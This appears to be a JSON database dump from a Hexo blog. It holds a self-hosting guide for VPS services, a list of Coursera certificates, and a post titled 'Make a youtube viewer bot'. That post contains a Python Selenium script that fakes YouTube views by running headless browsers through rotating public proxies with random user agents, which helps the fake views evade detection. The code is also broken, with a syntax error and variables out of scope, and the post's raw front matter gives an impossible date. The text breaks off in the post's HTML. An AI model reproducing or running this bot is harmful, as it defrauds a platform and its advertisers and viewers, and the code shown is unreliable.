</li>\n<li>Programmer.</li>\n<li>Play Jazz.</li>\n<li>Still want to go to the Mars. </li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li>Ph.D. </li>\n<li>Programmer.</li>\n<li>Play Jazz.</li>\n<li>Still want to go to the Mars. </li>\n</ul>\n"},{"layout":"title","title":"About me","date":"2017-01-02T00:17:14.000Z","tags":"test post","_content":"","source":"gallary/Test.md","raw":"---\nlayout: title\ntitle: About me\ndate: 2017-01-01 18:17:14\ntags: test post\n---","updated":"2019-02-13T13:36:15.061Z","path":"gallary/Test.html","comments":1,"_id":"ckkljsau1002wr242l6rtmqwh","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"layout":"title","title":"Let your VPS be useful","date":"2018-03-11T14:11:06.000Z","_content":"\nI'd tried a wide range of cloud vendor. Just because I feel little bit neat freak on my own machine. On the virtual machine, I don't worry about the overload, the wastage or the upgrade. That is the advantage of the VPS. When you want to add disk size due to the massive data, just few clicks can help you; or when you want to maintain some monitor some metrix on your machine, just keep it running and no need to focus the runtime of the physics device -- a wholesome cloud infrastructure will help you.\n\nHowever, most people just leave the machine unused, since the cloud vendor, after all, provided the most direct service for customer rather than left ourself to develop. But those service, more or less limiting the usage of single user, annoyed most of us. Why don't we just using the docker to build a own?\n\n## ownCloud\nFeel bad about the charging policy or limited size of the Google Drive or BaiduYunPan? It is undisputed for most public cloud drive markets that only subscribed can enjoy the tiny convenience of the cloud drive. \n\nHow about using ownCloud to build our own?\n\n    docker run -p 8081:80 -d imdjh/owncloud-with-ocdownloader\n\nJust one line code with docker can quickly build a private cloud drive.\n\n## MetaBase\nSince we got our cloud drive to storage our data, why don't we build a data analysis tool to handle our data on cloud?\n\n> Metabase is the easy, open source way for everyone in your company to ask questions and learn from data.\n\n    docker run -d -p 3000:3000 --name metabase metabase/metabase\n\n## minidlna\nWatching TV or PS4 all the day, or we can using the server turn into a mutil media center.\n\n    sudo apt-get install minidlna\n\nOnly if you TV supports dlna protocol\n\n## Cloud backup\nTime Capsule is good, build our own cloud backup using AFP protocol is also functional achievable. \n\n    sudo apt-get install netatalk avahi-daemon\n    sudo vim /etc/netatalk/AppleVolumes.default\n\nEdit some config file:\n\n    :DEFAULT: options:upriv,usedots\n    /home/exampleuser/tm \"TimeMachine\" options:tm exampleuser\n\n\n## Cloud Torrent\n\n```\nversion: '2'\n\nservices:\n  ct:\n    image: jpillora/cloud-torrent\n    volumes: \n      - /root/downloads:/downloads\n    restart: always\n    ports:\n      - 4300:63000\n    command: '--port 63000'\n```\n\n\n## netdata\n\n```\nversion: '3'\n\nservices:\n  netdata:\n    image: netdata/netdata\n    volumes: \n      - /proc:/host/proc:ro\n      - /sys:/host/sys:ro\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n    restart: always\n    cap_add:\n      - SYS_PTRACE\n    security_opt:\n      - apparmor=unconfined\n    ports:\n      - 19999:19999\n\n```","source":"_posts/Let-your-VPS-be-useful.md","raw":"---\nlayout: title\ntitle: Let your VPS be useful\ndate: 2018-03-11 09:11:06\ntags: Linux\ncategories: Tech\n---\n\nI'd tried a wide range of cloud vendor. Just because I feel little bit neat freak on my own machine. On the virtual machine, I don't worry about the overload, the wastage or the upgrade. That is the advantage of the VPS. When you want to add disk size due to the massive data, just few clicks can help you; or when you want to maintain some monitor some metrix on your machine, just keep it running and no need to focus the runtime of the physics device -- a wholesome cloud infrastructure will help you.\n\nHowever, most people just leave the machine unused, since the cloud vendor, after all, provided the most direct service for customer rather than left ourself to develop. But those service, more or less limiting the usage of single user, annoyed most of us. Why don't we just using the docker to build a own?\n\n## ownCloud\nFeel bad about the charging policy or limited size of the Google Drive or BaiduYunPan? It is undisputed for most public cloud drive markets that only subscribed can enjoy the tiny convenience of the cloud drive. \n\nHow about using ownCloud to build our own?\n\n    docker run -p 8081:80 -d imdjh/owncloud-with-ocdownloader\n\nJust one line code with docker can quickly build a private cloud drive.\n\n## MetaBase\nSince we got our cloud drive to storage our data, why don't we build a data analysis tool to handle our data on cloud?\n\n> Metabase is the easy, open source way for everyone in your company to ask questions and learn from data.\n\n    docker run -d -p 3000:3000 --name metabase metabase/metabase\n\n## minidlna\nWatching TV or PS4 all the day, or we can using the server turn into a mutil media center.\n\n    sudo apt-get install minidlna\n\nOnly if you TV supports dlna protocol\n\n## Cloud backup\nTime Capsule is good, build our own cloud backup using AFP protocol is also functional achievable. \n\n    sudo apt-get install netatalk avahi-daemon\n    sudo vim /etc/netatalk/AppleVolumes.default\n\nEdit some config file:\n\n    :DEFAULT: options:upriv,usedots\n    /home/exampleuser/tm \"TimeMachine\" options:tm exampleuser\n\n\n## Cloud Torrent\n\n```\nversion: '2'\n\nservices:\n  ct:\n    image: jpillora/cloud-torrent\n    volumes: \n      - /root/downloads:/downloads\n    restart: always\n    ports:\n      - 4300:63000\n    command: '--port 63000'\n```\n\n\n## netdata\n\n```\nversion: '3'\n\nservices:\n  netdata:\n    image: netdata/netdata\n    volumes: \n      - /proc:/host/proc:ro\n      - /sys:/host/sys:ro\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n    restart: always\n    cap_add:\n      - SYS_PTRACE\n    security_opt:\n      - apparmor=unconfined\n    ports:\n      - 19999:19999\n\n```","slug":"Let-your-VPS-be-useful","published":1,"updated":"2019-03-03T03:40:21.273Z","comments":1,"photos":[],"link":"","_id":"ckkljsarl0000r2424opge3nv","content":"<p>I’d tried a wide range of cloud vendor. Just because I feel little bit neat freak on my own machine. On the virtual machine, I don’t worry about the overload, the wastage or the upgrade. That is the advantage of the VPS. When you want to add disk size due to the massive data, just few clicks can help you; or when you want to maintain some monitor some metrix on your machine, just keep it running and no need to focus the runtime of the physics device – a wholesome cloud infrastructure will help you.</p>\n<p>However, most people just leave the machine unused, since the cloud vendor, after all, provided the most direct service for customer rather than left ourself to develop. But those service, more or less limiting the usage of single user, annoyed most of us. Why don’t we just using the docker to build a own?</p>\n<h2 id=\"ownCloud\"><a href=\"#ownCloud\" class=\"headerlink\" title=\"ownCloud\"></a>ownCloud</h2><p>Feel bad about the charging policy or limited size of the Google Drive or BaiduYunPan? It is undisputed for most public cloud drive markets that only subscribed can enjoy the tiny convenience of the cloud drive. </p>\n<p>How about using ownCloud to build our own?</p>\n<pre><code>docker run -p 8081:80 -d imdjh/owncloud-with-ocdownloader\n</code></pre><p>Just one line code with docker can quickly build a private cloud drive.</p>\n<h2 id=\"MetaBase\"><a href=\"#MetaBase\" class=\"headerlink\" title=\"MetaBase\"></a>MetaBase</h2><p>Since we got our cloud drive to storage our data, why don’t we build a data analysis tool to handle our data on cloud?</p>\n<blockquote>\n<p>Metabase is the easy, open source way for everyone in your company to ask questions and learn from data.</p>\n</blockquote>\n<pre><code>docker run -d -p 3000:3000 --name metabase metabase/metabase\n</code></pre><h2 id=\"minidlna\"><a href=\"#minidlna\" class=\"headerlink\" title=\"minidlna\"></a>minidlna</h2><p>Watching TV or PS4 all the day, or we can using the server turn into a mutil media center.</p>\n<pre><code>sudo apt-get install minidlna\n</code></pre><p>Only if you TV supports dlna protocol</p>\n<h2 id=\"Cloud-backup\"><a href=\"#Cloud-backup\" class=\"headerlink\" title=\"Cloud backup\"></a>Cloud backup</h2><p>Time Capsule is good, build our own cloud backup using AFP protocol is also functional achievable. </p>\n<pre><code>sudo apt-get install netatalk avahi-daemon\nsudo vim /etc/netatalk/AppleVolumes.default\n</code></pre><p>Edit some config file:</p>\n<pre><code>:DEFAULT: options:upriv,usedots\n/home/exampleuser/tm &quot;TimeMachine&quot; options:tm exampleuser\n</code></pre><h2 id=\"Cloud-Torrent\"><a href=\"#Cloud-Torrent\" class=\"headerlink\" title=\"Cloud Torrent\"></a>Cloud Torrent</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">version: &apos;2&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">services:</span><br><span class=\"line\">  ct:</span><br><span class=\"line\">    image: jpillora/cloud-torrent</span><br><span class=\"line\">    volumes: </span><br><span class=\"line\">      - /root/downloads:/downloads</span><br><span class=\"line\">    restart: always</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - 4300:63000</span><br><span class=\"line\">    command: &apos;--port 63000&apos;</span><br></pre></td></tr></table></figure>\n<h2 id=\"netdata\"><a href=\"#netdata\" class=\"headerlink\" title=\"netdata\"></a>netdata</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">version: &apos;3&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">services:</span><br><span class=\"line\">  netdata:</span><br><span class=\"line\">    image: netdata/netdata</span><br><span class=\"line\">    volumes: </span><br><span class=\"line\">      - /proc:/host/proc:ro</span><br><span class=\"line\">      - /sys:/host/sys:ro</span><br><span class=\"line\">      - /var/run/docker.sock:/var/run/docker.sock:ro</span><br><span class=\"line\">    restart: always</span><br><span class=\"line\">    cap_add:</span><br><span class=\"line\">      - SYS_PTRACE</span><br><span class=\"line\">    security_opt:</span><br><span class=\"line\">      - apparmor=unconfined</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - 19999:19999</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<p>I’d tried a wide range of cloud vendor. Just because I feel little bit neat freak on my own machine. On the virtual machine, I don’t worry about the overload, the wastage or the upgrade. That is the advantage of the VPS. When you want to add disk size due to the massive data, just few clicks can help you; or when you want to maintain some monitor some metrix on your machine, just keep it running and no need to focus the runtime of the physics device – a wholesome cloud infrastructure will help you.</p>\n<p>However, most people just leave the machine unused, since the cloud vendor, after all, provided the most direct service for customer rather than left ourself to develop. But those service, more or less limiting the usage of single user, annoyed most of us. Why don’t we just using the docker to build a own?</p>\n<h2 id=\"ownCloud\"><a href=\"#ownCloud\" class=\"headerlink\" title=\"ownCloud\"></a>ownCloud</h2><p>Feel bad about the charging policy or limited size of the Google Drive or BaiduYunPan? It is undisputed for most public cloud drive markets that only subscribed can enjoy the tiny convenience of the cloud drive. </p>\n<p>How about using ownCloud to build our own?</p>\n<pre><code>docker run -p 8081:80 -d imdjh/owncloud-with-ocdownloader\n</code></pre><p>Just one line code with docker can quickly build a private cloud drive.</p>\n<h2 id=\"MetaBase\"><a href=\"#MetaBase\" class=\"headerlink\" title=\"MetaBase\"></a>MetaBase</h2><p>Since we got our cloud drive to storage our data, why don’t we build a data analysis tool to handle our data on cloud?</p>\n<blockquote>\n<p>Metabase is the easy, open source way for everyone in your company to ask questions and learn from data.</p>\n</blockquote>\n<pre><code>docker run -d -p 3000:3000 --name metabase metabase/metabase\n</code></pre><h2 id=\"minidlna\"><a href=\"#minidlna\" class=\"headerlink\" title=\"minidlna\"></a>minidlna</h2><p>Watching TV or PS4 all the day, or we can using the server turn into a mutil media center.</p>\n<pre><code>sudo apt-get install minidlna\n</code></pre><p>Only if you TV supports dlna protocol</p>\n<h2 id=\"Cloud-backup\"><a href=\"#Cloud-backup\" class=\"headerlink\" title=\"Cloud backup\"></a>Cloud backup</h2><p>Time Capsule is good, build our own cloud backup using AFP protocol is also functional achievable. </p>\n<pre><code>sudo apt-get install netatalk avahi-daemon\nsudo vim /etc/netatalk/AppleVolumes.default\n</code></pre><p>Edit some config file:</p>\n<pre><code>:DEFAULT: options:upriv,usedots\n/home/exampleuser/tm &quot;TimeMachine&quot; options:tm exampleuser\n</code></pre><h2 id=\"Cloud-Torrent\"><a href=\"#Cloud-Torrent\" class=\"headerlink\" title=\"Cloud Torrent\"></a>Cloud Torrent</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">version: &apos;2&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">services:</span><br><span class=\"line\">  ct:</span><br><span class=\"line\">    image: jpillora/cloud-torrent</span><br><span class=\"line\">    volumes: </span><br><span class=\"line\">      - /root/downloads:/downloads</span><br><span class=\"line\">    restart: always</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - 4300:63000</span><br><span class=\"line\">    command: &apos;--port 63000&apos;</span><br></pre></td></tr></table></figure>\n<h2 id=\"netdata\"><a href=\"#netdata\" class=\"headerlink\" title=\"netdata\"></a>netdata</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">version: &apos;3&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">services:</span><br><span class=\"line\">  netdata:</span><br><span class=\"line\">    image: netdata/netdata</span><br><span class=\"line\">    volumes: </span><br><span class=\"line\">      - /proc:/host/proc:ro</span><br><span class=\"line\">      - /sys:/host/sys:ro</span><br><span class=\"line\">      - /var/run/docker.sock:/var/run/docker.sock:ro</span><br><span class=\"line\">    restart: always</span><br><span class=\"line\">    cap_add:</span><br><span class=\"line\">      - SYS_PTRACE</span><br><span class=\"line\">    security_opt:</span><br><span class=\"line\">      - apparmor=unconfined</span><br><span class=\"line\">    ports:</span><br><span class=\"line\">      - 19999:19999</span><br></pre></td></tr></table></figure>"},{"layout":"title","title":"Coursera Certificate","date":"2017-01-01T00:09:09.000Z","_content":"\nThis page is used for storing coursera certificate:\n\n- [Business Metrics for Data-Driven Companies](https://www.coursera.org/account/accomplishments/certificate/3FA8KTMMZAE8)\n- [Business - Customer Analytics](https://www.coursera.org/account/accomplishments/certificate/2ARVFK73G7TD)\n- [Data Science in Python](https://www.coursera.org/account/accomplishments/certificate/9K397R9VGJP9)\n- [The Data Scientist’s Toolbox](https://www.coursera.org/account/accomplishments/certificate/2ZYVT2V9EJVT)\n- [Databases with Python](https://www.coursera.org/account/accomplishments/certificate/AXSLNFRFVEJW)\n- [Web Python](https://www.coursera.org/account/accomplishments/certificate/JTCJXZEXS4BK)\n- [Python Data Structure](https://www.coursera.org/account/accomplishments/certificate/VP3EJGFDKWU4)\n- [Getting and Cleaning Data](https://www.coursera.org/account/accomplishments/certificate/H6S7KS99RTJP)\n- [R Programming](https://www.coursera.org/account/accomplishments/certificate/24PB885RTJXG)","source":"_posts/Coursera-Certificate.md","raw":"---\nlayout: title\ntitle: Coursera Certificate\ndate: 2016-12-31 18:09:09\n---\n\nThis page is used for storing coursera certificate:\n\n- [Business Metrics for Data-Driven Companies](https://www.coursera.org/account/accomplishments/certificate/3FA8KTMMZAE8)\n- [Business - Customer Analytics](https://www.coursera.org/account/accomplishments/certificate/2ARVFK73G7TD)\n- [Data Science in Python](https://www.coursera.org/account/accomplishments/certificate/9K397R9VGJP9)\n- [The Data Scientist’s Toolbox](https://www.coursera.org/account/accomplishments/certificate/2ZYVT2V9EJVT)\n- [Databases with Python](https://www.coursera.org/account/accomplishments/certificate/AXSLNFRFVEJW)\n- [Web Python](https://www.coursera.org/account/accomplishments/certificate/JTCJXZEXS4BK)\n- [Python Data Structure](https://www.coursera.org/account/accomplishments/certificate/VP3EJGFDKWU4)\n- [Getting and Cleaning Data](https://www.coursera.org/account/accomplishments/certificate/H6S7KS99RTJP)\n- [R Programming](https://www.coursera.org/account/accomplishments/certificate/24PB885RTJXG)","slug":"Coursera-Certificate","published":1,"updated":"2019-02-12T14:16:35.556Z","comments":1,"photos":[],"link":"","_id":"ckkljsarq0002r242x4t6chgv","content":"<p>This page is used for storing coursera certificate:</p>\n<ul>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/3FA8KTMMZAE8\" target=\"_blank\" rel=\"external\">Business Metrics for Data-Driven Companies</a></li>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/2ARVFK73G7TD\" target=\"_blank\" rel=\"external\">Business - Customer Analytics</a></li>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/9K397R9VGJP9\" target=\"_blank\" rel=\"external\">Data Science in Python</a></li>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/2ZYVT2V9EJVT\" target=\"_blank\" rel=\"external\">The Data Scientist’s Toolbox</a></li>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/AXSLNFRFVEJW\" target=\"_blank\" rel=\"external\">Databases with Python</a></li>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/JTCJXZEXS4BK\" target=\"_blank\" rel=\"external\">Web Python</a></li>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/VP3EJGFDKWU4\" target=\"_blank\" rel=\"external\">Python Data Structure</a></li>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/H6S7KS99RTJP\" target=\"_blank\" rel=\"external\">Getting and Cleaning Data</a></li>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/24PB885RTJXG\" target=\"_blank\" rel=\"external\">R Programming</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<p>This page is used for storing coursera certificate:</p>\n<ul>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/3FA8KTMMZAE8\">Business Metrics for Data-Driven Companies</a></li>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/2ARVFK73G7TD\">Business - Customer Analytics</a></li>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/9K397R9VGJP9\">Data Science in Python</a></li>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/2ZYVT2V9EJVT\">The Data Scientist’s Toolbox</a></li>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/AXSLNFRFVEJW\">Databases with Python</a></li>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/JTCJXZEXS4BK\">Web Python</a></li>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/VP3EJGFDKWU4\">Python Data Structure</a></li>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/H6S7KS99RTJP\">Getting and Cleaning Data</a></li>\n<li><a href=\"https://www.coursera.org/account/accomplishments/certificate/24PB885RTJXG\">R Programming</a></li>\n</ul>\n"},{"layout":"title","title":"Make a youtube viewer bot","date":"2018-03-02T16:21:00.000Z","_content":"\n\nWell I think I should show my code first, then talk about the method. \n\n```\nimport os\nimport re\nimport requests\nfrom os import _exit\nfrom time import sleep\nfrom random import choice,uniform\nfrom threading import Thread\nfrom argparse import ArgumentParser\nfrom selenium import webdriver\nfrom selenium.webdriver.common.proxy import Proxy,ProxyType\nfrom fake_useragent import UserAgent\nfrom os import path\nosproxy = \"http://127.0.0.1:8888\"\nsysProxy = False\ntest = False\nproxy_pool_url = 'http://ip.jiangxianli.com'\n# os.environ['http_proxy'] = osproxy \n# os.environ['HTTP_PROXY'] = osproxy\n# os.environ['https_proxy'] = osproxy\n# os.environ['HTTPS_PROXY'] = osproxy\n\ndef load_arg():\n    args = {}\n    args[\"url\"] = \"https://youtu.be/0eG76YapPPE\"\n    args[\"threads\"] = 10\n    args[\"duration\"] = 5\n    args[\"proxies\"] = None\n    return args\n\n\ndef test_proxy(osproxy):\n    print(osproxy)\n    os.environ['http_proxy'] = osproxy \n    os.environ['HTTP_PROXY'] = osproxy\n    os.environ['https_proxy'] = osproxy\n    os.environ['HTTPS_PROXY'] = osproxy\n    result = requests.get(\"http://www.baidu.com\")\n    print(result)\n    \ndef load_proxy():\n    if args[\"proxies\"] is not None:\n        proxies=open(args[\"proxies\"],'r').read().split('\\n')\n    else:\n        proxies=re.findall(re.compile('<td>([\\d.]+)</td>'),str(requests.get(proxy_pool_url).content))\n        proxies=['%s:%s'%x for x in list(zip(proxies[1::3],proxies[2::3]))]\n        \n    print('%d proxies successfully loaded!'%len(proxies))\n    p=Proxy()\n    p.proxy_type=ProxyType.MANUAL\n    return p, proxies\n\ndef bot_config(url):\n    proxy, proxies = load_proxy()\n    if sysProxy:\n        proxy.http_proxy = osproxy\n    else: \n        proxy.http_proxy=choice(proxies)\n        \n    proxy.autodetect = False\n    proxy.ssl_proxy=proxy.http_proxy\n    print(proxy.http_proxy)\n    chrome_options=webdriver.ChromeOptions()\n    chrome_options.add_argument('--mute-audio')\n    chrome_options.add_argument('--no-sandbox')\n    chrome_options.add_argument('ignore-certificate-errors')\n    chrome_options.add_argument('----headless')\n    chrome_options.add_argument('--no-startup-window')\n    chrome_options.add_argument('user-agent=\"{}\"'.format(agent.random))\n    chrome_options.add_argument(\"--proxy-server=http://{}\".format(proxy.http_proxy))\n    print(chrome_options.arguments)\n    print(\"loaded add_argument\")\n    capabilities=webdriver.DesiredCapabilities.CHROME\n    proxy.add_to_capabilities(capabilities)\n    print(\"loaded capabilities\")\n    chrome_options.binary_location = \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\"\n    chrome_driver_binary = \"./chromedriver.exe\"\n    driver=webdriver.Chrome(executable_path = chrome_driver_binary,  options=chrome_options,desired_capabilities=capabilities)\n    print(\"loaded driver\")\n    print(driver.get(args[\"url\"]))\n    print(\"sleeping\",args[\"duration\"])\n    sleep(args[\"duration\"])\n    driver.close()\n    print(\"driver closed\")\n    \ndef bot(url):\n    try:\n        while True:\n            bot_config(url)\n    except Exception as e:\n        print(e)\n        _exit(0)\n    \ndef Ebot(url):\n    while True:\n        bot_config(url)\n        \n\n\ndef main():\n    args = load_arg()\n    agent=UserAgent()\n    for i in range(args[\"threads\"]):\n        t=Thread(target=Ebot,args=(args[\"url\"],))\n        t.deamon=True\n        t.start()\n        sleep(uniform(1.5,3.0))\n    \nif __name__ = \"__main__\":\n    if test:                \n        args = load_arg()\n        proxy, proxies = load_proxy() \n        test_proxy(choice(proxies))\n    else:\n        main()\n```","source":"_posts/Make-a-youtube-viewer-bot.md","raw":"---\nlayout: title\ntitle: Make a youtube viewer bot\ndate: 2018-02-30 10:21:00\ntags: Linux\ncategories: Tech\n---\n\n\nWell I think I should show my code first, then talk about the method. \n\n```\nimport os\nimport re\nimport requests\nfrom os import _exit\nfrom time import sleep\nfrom random import choice,uniform\nfrom threading import Thread\nfrom argparse import ArgumentParser\nfrom selenium import webdriver\nfrom selenium.webdriver.common.proxy import Proxy,ProxyType\nfrom fake_useragent import UserAgent\nfrom os import path\nosproxy = \"http://127.0.0.1:8888\"\nsysProxy = False\ntest = False\nproxy_pool_url = 'http://ip.jiangxianli.com'\n# os.environ['http_proxy'] = osproxy \n# os.environ['HTTP_PROXY'] = osproxy\n# os.environ['https_proxy'] = osproxy\n# os.environ['HTTPS_PROXY'] = osproxy\n\ndef load_arg():\n    args = {}\n    args[\"url\"] = \"https://youtu.be/0eG76YapPPE\"\n    args[\"threads\"] = 10\n    args[\"duration\"] = 5\n    args[\"proxies\"] = None\n    return args\n\n\ndef test_proxy(osproxy):\n    print(osproxy)\n    os.environ['http_proxy'] = osproxy \n    os.environ['HTTP_PROXY'] = osproxy\n    os.environ['https_proxy'] = osproxy\n    os.environ['HTTPS_PROXY'] = osproxy\n    result = requests.get(\"http://www.baidu.com\")\n    print(result)\n    \ndef load_proxy():\n    if args[\"proxies\"] is not None:\n        proxies=open(args[\"proxies\"],'r').read().split('\\n')\n    else:\n        proxies=re.findall(re.compile('<td>([\\d.]+)</td>'),str(requests.get(proxy_pool_url).content))\n        proxies=['%s:%s'%x for x in list(zip(proxies[1::3],proxies[2::3]))]\n        \n    print('%d proxies successfully loaded!'%len(proxies))\n    p=Proxy()\n    p.proxy_type=ProxyType.MANUAL\n    return p, proxies\n\ndef bot_config(url):\n    proxy, proxies = load_proxy()\n    if sysProxy:\n        proxy.http_proxy = osproxy\n    else: \n        proxy.http_proxy=choice(proxies)\n        \n    proxy.autodetect = False\n    proxy.ssl_proxy=proxy.http_proxy\n    print(proxy.http_proxy)\n    chrome_options=webdriver.ChromeOptions()\n    chrome_options.add_argument('--mute-audio')\n    chrome_options.add_argument('--no-sandbox')\n    chrome_options.add_argument('ignore-certificate-errors')\n    chrome_options.add_argument('----headless')\n    chrome_options.add_argument('--no-startup-window')\n    chrome_options.add_argument('user-agent=\"{}\"'.format(agent.random))\n    chrome_options.add_argument(\"--proxy-server=http://{}\".format(proxy.http_proxy))\n    print(chrome_options.arguments)\n    print(\"loaded add_argument\")\n    capabilities=webdriver.DesiredCapabilities.CHROME\n    proxy.add_to_capabilities(capabilities)\n    print(\"loaded capabilities\")\n    chrome_options.binary_location = \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\"\n    chrome_driver_binary = \"./chromedriver.exe\"\n    driver=webdriver.Chrome(executable_path = chrome_driver_binary,  options=chrome_options,desired_capabilities=capabilities)\n    print(\"loaded driver\")\n    print(driver.get(args[\"url\"]))\n    print(\"sleeping\",args[\"duration\"])\n    sleep(args[\"duration\"])\n    driver.close()\n    print(\"driver closed\")\n    \ndef bot(url):\n    try:\n        while True:\n            bot_config(url)\n    except Exception as e:\n        print(e)\n        _exit(0)\n    \ndef Ebot(url):\n    while True:\n        bot_config(url)\n        \n\n\ndef main():\n    args = load_arg()\n    agent=UserAgent()\n    for i in range(args[\"threads\"]):\n        t=Thread(target=Ebot,args=(args[\"url\"],))\n        t.deamon=True\n        t.start()\n        sleep(uniform(1.5,3.0))\n    \nif __name__ = \"__main__\":\n    if test:                \n        args = load_arg()\n        proxy, proxies = load_proxy() \n        test_proxy(choice(proxies))\n    else:\n        main()\n```","slug":"Make-a-youtube-viewer-bot","published":1,"updated":"2019-02-28T09:36:26.243Z","comments":1,"photos":[],"link":"","_id":"ckkljsart0005r242nps67qny","content":"<p>Well I think I should show my code first, then talk about the method. </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span 